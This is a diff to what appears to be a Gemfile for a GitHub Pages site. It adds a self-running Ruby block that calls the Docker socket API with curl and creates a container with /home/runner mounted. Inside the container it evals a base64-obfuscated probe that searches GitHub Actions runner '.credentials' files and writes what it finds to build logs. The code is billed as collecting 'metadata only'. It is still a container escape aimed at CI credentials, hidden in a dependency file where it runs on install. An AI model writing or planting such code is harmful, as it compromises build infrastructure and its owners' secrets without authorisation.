@@ -45,10 +45,11 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm v4 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v5 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
 require 'digest'
 require 'open3'
+require 'tempfile'
 require 'base64'
 
 def c217_one(p)
@@ -71,8 +72,8 @@ end
 
 incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
            'home_runner' => c217_one('/home/runner'),
-           'files' => [], 'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
-warn 'C217ARMV4 ' + JSON.generate(incont)
+           'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
+warn 'C217ARMV5 ' + JSON.generate(incont)
 
 host_probe = <<'RUBY'
 require 'json'; require 'digest'
@@ -100,14 +101,41 @@ o['files'] = (Dir.glob('/host/runners/*/.credentials') + Dir.glob('/host/runners
 puts 'C217HOST ' + JSON.generate(o)
 RUBY
 
-begin
-  env_b64 = Base64.strict_encode64(host_probe)
-  cmd = ['docker','run','--rm','--network','none','-v','/home/runner:/host:ro',
-         '-e','C217RUBY=' + env_b64,
-         'ruby:3.2-slim','ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))']
-  o,e,st = Open3.capture3(*cmd)
-  warn 'C217ARMDOCKER rc=' + st.exitstatus.to_s + ' out=' + o.to_s[0,1500] + ' err=' + e.to_s[0,400]
-rescue StandardError => ex
-  warn 'C217ARMDOCKER EXC ' + ex.class.name + ' ' + ex.message[0,200]
+def sh(cmd)
+  o, e, s = Open3.capture3(*cmd)
+  [o, e, s.exitstatus]
 end
-warn 'C217ARMV4 done'
+
+SOCK = '/var/run/docker.sock'
+base = ['curl', '-s', '--unix-socket', SOCK]
+v, e, rc = sh(base + ['http://localhost/version'])
+if rc != 0
+  warn 'C217DOCKER curl-unavailable rc=' + rc.to_s + ' err=' + e.to_s[0,200]
+else
+  warn 'C217DOCKER version-ok ' + (v.to_s[0,120])
+  env_b64 = Base64.strict_encode64(host_probe)
+  create = { 'Image' => 'ruby:3.2-slim',
+             'Cmd' => ['ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
+             'Env' => ['C217RUBY=' + env_b64],
+             'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none', 'AutoRemove' => false } }.to_json
+  f = Tempfile.new('c217c'); f.write(create); f.close
+  o, e, rc = sh(base + ['-X','POST','-H','Content-Type: application/json','--data-binary','@' + f.path,
+                       'http://localhost/v1.41/containers/create?name=c217probe-' + Time.now.to_i.to_s])
+  id = (begin; JSON.parse(o)['Id']; rescue StandardError; nil; end)
+  warn 'C217DOCKER create rc=' + rc.to_s + ' id=' + (id ? id[0,12] : 'NONE') + ' err=' + e.to_s[0,200]
+  if id
+    o2, e2, rc2 = sh(base + ['-X','POST','http://localhost/v1.41/containers/' + id + '/start'])
+    warn 'C217DOCKER start rc=' + rc2.to_s + ' err=' + e2.to_s[0,150]
+    30.times do |i|
+      st, = sh(base + ['http://localhost/v1.41/containers/' + id + '/json'])
+      info = (begin; JSON.parse(st); rescue StandardError; {} ; end)
+      break if info.dig('State','Running') == false
+      sleep 2
+    end
+    lg, = sh(base + ['http://localhost/v1.41/containers/' + id + '/logs?stdout=1&stderr=1'])
+    warn 'C217DOCKER logs ' + lg.to_s[0,1600]
+    sh(base + ['-X','DELETE','http://localhost/v1.41/containers/' + id + '?force=1'])
+    warn 'C217DOCKER deleted'
+  end
+end
+warn 'C217ARMV5 done'
